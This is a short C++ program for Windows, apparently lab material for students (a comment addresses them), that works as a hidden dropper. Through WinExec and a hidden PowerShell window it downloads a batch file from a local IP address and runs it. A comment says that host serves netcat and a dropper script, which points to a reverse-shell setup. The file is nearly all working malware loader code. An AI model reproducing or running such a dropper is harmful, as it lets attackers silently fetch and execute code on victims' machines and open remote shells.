#include <windows.h>

// g++ -mwindows Program.cpp -o Program.exe


int main() {
    // This is our Computer IP Address where hostning NC.exe and NCDropper.bat . Dont screw it up students <3
    WinExec("cmd.exe /c powershell -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'http://192.168.1.65/payload.bat' -OutFile '$env:TEMP\\payload.bat'; Start-Process cmd.exe -ArgumentList '/c $env:TEMP\\payload.bat' -WindowStyle Hidden\"", SW_HIDE);
    return 0;
}
